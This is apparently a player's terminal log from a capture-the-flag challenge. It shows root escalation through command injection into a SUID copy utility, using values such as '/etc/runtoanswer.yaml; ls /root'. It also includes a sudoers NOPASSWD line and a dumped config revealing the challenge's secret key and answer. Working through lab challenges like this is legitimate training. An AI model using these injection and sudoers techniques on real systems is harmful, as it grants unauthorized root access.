/usr/bin/simplecopy is suspicious and has SUID bit set

elf@31f95b1a1981:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/simplecopy


echo "elf ALL=(ALL) NOPASSWD: ALL" > sudoers

simplecopy seems to be a stripped version of cp
--help is replaced with Usage: /usr/bin/simplecopy <source> <destination>

elf@d6cdd33cdbb6:~$ simplecopy "/etc/runtoanswer.yaml; ls /root" /home/elf/ru 
cp: missing destination file operand after '/etc/runtoanswer.yaml'
Try 'cp --help' for more information.
ls: cannot access '/home/elf/ru': No such file or directory
/root:
runmetoanswer

elf@d6cdd33cdbb6:~$ simplecopy "/etc/runtoanswer.yaml; /root/runmetoanswer" /home/elf/ru
cp: missing destination file operand after '/etc/runtoanswer.yaml'
Try 'cp --help' for more information.
Your answer: /home/elf/ru

Checking....
Sorry, that answer is incorrect. Please try again!

elf@d6cdd33cdbb6:~$ simplecopy "/etc/runtoanswer.yaml; cat /etc/runtoanswer.yaml" /home/elf/ru
cp: missing destination file operand after '/etc/runtoanswer.yaml'
Try 'cp --help' for more information.
# This is the config file for runtoanswer, where you can set up your challenge!
---

# This is the completionSecret from the Content sheet - don't tell the user this!
key: b08b538569e395f88e12ef9fe751ac39

# The answer that the user is expected to enter - case sensitive
# (This is optional - if you don't have an answer, then running this will immediately win)
answer: "santa"

text: |
  Who delivers Christmas presents?

success_message: "Your answer is *correct*!"
failure_message: "Sorry, that answer is *incorrect*. Please try again!"

# A prompt that is displayed if the user runs this interactively (they might
# not see this - answers can be entered as an argument)
prompt: "> "

# Optional: a time, in seconds, to delay before validating the answer (to
# prevent guessing)
delay: 1

# Optional: skip (most) stdout output if the answer is correct
headless: false

# If set to true, don't exit after the user asks
keep_going: false

# Optional: play this sound on completion or failure
#completion_sound: 'myhappysound.mp3'
#failure_sound: 'mysadsound.mp3'

# Close the terminal when it is completed?
exit_on_completion: falsecat: /home/elf/ru: No such file or directory


elf@d6cdd33cdbb6:~$ touch santa
elf@d6cdd33cdbb6:~$ ls
HELP  run  santa  test1  test2
elf@d6cdd33cdbb6:~$ simplecopy santa /santa
elf@d6cdd33cdbb6:~$ ls /
bin   dev  home  lib32  libx32  mnt  proc  run    sbin  sys  usr
boot  etc  lib   lib64  media   opt  root  santa  srv   tmp  var
elf@d6cdd33cdbb6:~$ cd /                                                                      
elf@d6cdd33cdbb6:/$ simplecopy "/etc/runtoanswer.yaml; /root/runmetoanswer" santa             
cp: missing destination file operand after '/etc/runtoanswer.yaml'
Try 'cp --help' for more information.
Your answer: santa

Checking....
Your answer is correct!

